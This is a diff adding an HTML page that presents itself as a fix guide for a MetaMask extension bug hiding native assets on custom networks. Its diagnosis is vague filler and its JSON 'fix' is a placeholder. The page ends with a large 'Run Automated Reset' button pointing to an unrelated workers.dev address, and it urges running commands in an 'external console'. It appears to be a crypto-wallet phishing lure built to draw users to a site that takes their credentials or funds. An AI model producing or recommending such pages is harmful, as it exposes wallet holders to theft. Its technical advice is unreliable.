@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Native Assets For Custom Networks – Fix Guide</title>
+<style>
+    body {
+        font-family: -apple-system;
+        background: #0f111a;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff7b2c; }
+    .btn {
+        background: #ff7b2c;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h1>Metamask Extension Bug Assets Native Assets For Custom Networks</h1>
+<h2>Symptom</h2>
+<ul>
+<li>Users are unable to view native assets for custom networks when selected in the Metamask extension, resulting in an incomplete asset list.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The issue arises from a bug in the Metamask extension's asset handling mechanism, specifically with regards to custom networks, where native assets are not properly retrieved or displayed.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>To temporarily resolve the issue, users can attempt the following manual overrides:</li>
+<li>Update the Metamask extension to the latest version</li>
+<li>Reset the Metamask extension settings to default</li>
+<li>Utilize the following JSON configuration to manually add native assets for custom networks:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;custom-network&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;nativeAsset&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;native-asset-symbol&quot;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Consider utilizing an external console to execute these commands for a more streamlined experience. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured</li>
+<li>Custom network added to the Metamask extension</li>
+<li>Native assets defined for the custom network</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li></ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
